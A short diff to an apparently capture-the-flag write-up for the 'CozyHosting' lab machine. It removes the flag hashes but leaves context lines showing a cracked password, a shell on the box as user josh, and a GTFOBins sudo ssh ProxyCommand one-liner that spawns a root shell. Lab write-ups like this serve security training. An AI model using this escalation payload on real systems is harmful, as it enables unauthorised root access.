@@ -150,7 +150,7 @@ password: manchesterunited
 
 josh@cozyhosting:~$ whoami
 josh@cozyhosting:~$ ls
-josh@cozyhosting:~$ cat user.txt            # 7da99d1778329fd15fbe101239f59ffa
+josh@cozyhosting:~$ cat user.txt
 ```
 
 ### Privilege Escalation
@@ -168,5 +168,5 @@ After searching in google, there is a simple payload at GTFOBINS which successfu
 ```
 josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 cd /root
-cat root.txt         # 1f7c8db4e345642a5357f002a4a9618c
+cat root.txt
 ```
